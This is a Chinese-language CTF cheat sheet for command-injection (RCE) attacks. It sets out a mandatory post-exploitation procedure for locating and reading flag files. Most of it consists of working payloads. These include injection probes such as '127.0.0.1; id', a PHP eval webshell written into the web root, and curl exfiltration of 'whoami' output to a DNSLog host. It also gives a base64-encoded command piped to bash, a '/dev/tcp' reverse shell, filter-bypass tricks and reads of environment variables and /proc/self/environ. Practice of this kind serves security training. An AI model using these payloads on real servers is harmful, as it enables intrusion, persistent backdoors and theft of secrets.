# 命令执行 (RCE)

## 描述
通过注入系统命令，在服务器上执行任意代码，获取权限或读取Flag。

## 触发条件
- 存在 `ping`、`traceroute`、`nslookup` 等功能，用户输入IP或域名。
- 使用 `system()`、`exec()`、`shell_exec()`、`eval()` 等危险函数处理用户输入。

## 检测方法
1. **基本测试**：输入 `127.0.0.1; id`，观察是否输出 `uid=...`。
2. **延时测试**：输入 `127.0.0.1; sleep 5`，观察响应延迟。

## RCE后标准信息收集流程（必须遵守）

**禁止直接猜测 flag 位置（如 `cat /flag`）！** flag 文件名和位置不确定，必须按以下步骤逐步排查：

### 第一步：确认当前环境
```bash
id              # 确认当前用户和权限
pwd             # 确认当前工作目录
whoami          # 确认用户身份
```

### 第二步：查看当前目录文件
```bash
ls -la          # 列出当前目录所有文件（含隐藏文件）
ls -la ./       # 同上，明确当前目录
```

### 第三步：查看上级目录和Web根目录
```bash
ls -la ../                     # 上级目录
ls -la /var/www/html/           # Web根目录（常见）
ls -la /var/www/                # Web父目录
ls -la /tmp/                    # 临时目录（flag常见位置）
```

### 第四步：全局搜索flag文件
```bash
# 搜索常见flag文件名
find / -name "flag*" -type f 2>/dev/null
find / -name "FLAG*" -type f 2>/dev/null
find / -name "*flag*" -type f 2>/dev/null

# 搜索其他常见CTF文件名
find / -name "ctf*" -type f 2>/dev/null
find / -name "secret*" -type f 2>/dev/null
find / -name "read*" -type f 2>/dev/null

# 如果find不可用，用ls递归
ls -R / 2>/dev/null | grep -i flag
```

### 第五步：检查环境变量和配置文件
```bash
env                         # 环境变量中可能有flag
cat /etc/environment        # 系统环境变量
cat /proc/self/environ      # 进程环境变量
```

### 第六步：读取找到的flag文件
```bash
# 根据搜索结果读取，不要假设文件名
cat /path/to/discovered_flag_file
# 如果cat被过滤，尝试替代方案
tac /path/to/flag           # 倒序输出
nl /path/to/flag            # 带行号
more /path/to/flag          # 分页查看
head /path/to/flag          # 前几行
tail /path/to/flag          # 后几行
sort /path/to/flag          # 排序输出
```

## 利用方式
- **直接输出**：`; whoami`、`| ls`、`&& id`
- **无回显时**：
  - 写入文件：`; echo "<?php eval($_POST[1]);?>" > /var/www/html/shell.php`
  - DNSLog外带：`; curl http://your-server.ceye.io/$(whoami)`（需有网络）
  - 延时判断：`; if [ -f /flag ]; then sleep 10; fi`（时间盲注式检测）
- **编码绕过**：使用 `base64` 编码命令，如 `echo "Y2F0IC9mbGFn" | base64 -d | bash`

## 常见绕过
- **空格过滤**：使用 `${IFS}` 或 `%09`（tab）或 `<`、`<>` 重定向。
- **黑名单关键字**：使用 `'` 或 `"` 包围，如 `c''at`，或使用 `$*`、`$@`，如 `ca$*t`。
- **管道符替换**：`;` → `|` → `||` → `&` → `&&`。
- **cat被过滤**：`tac`、`nl`、`more`、`less`、`head`、`tail`、`sort`、`strings`、`rev`、`od`

## 常见flag位置参考（仅供参考，不要直接猜）
- `/flag`、`/flag.txt`、`/flag.php`
- `/tmp/flag`、`/tmp/*flag*`
- `/var/www/html/flag`、`/var/www/flag`
- `/home/*/flag`、`/root/flag`
- 环境变量中：`env | grep -i flag`
- 数据库中：需通过SQL注入或数据库命令读取
- Docker环境：`/flag`、`/.flag`、`/root/flag`

## 附加提示
- 某些环境禁用 `exec` 等函数，可尝试 `proc_open` 或 `popen`。
- 若无法写WebShell，可尝试反弹Shell（如 `bash -i >& /dev/tcp/ip/port 0>&1`）。
- **RCE获得后，第一步永远是信息收集（ls/find/env），不是直接读flag！**
- flag可能藏在非标准位置：图片文件（steghide分离）、数据库、配置文件、注释中。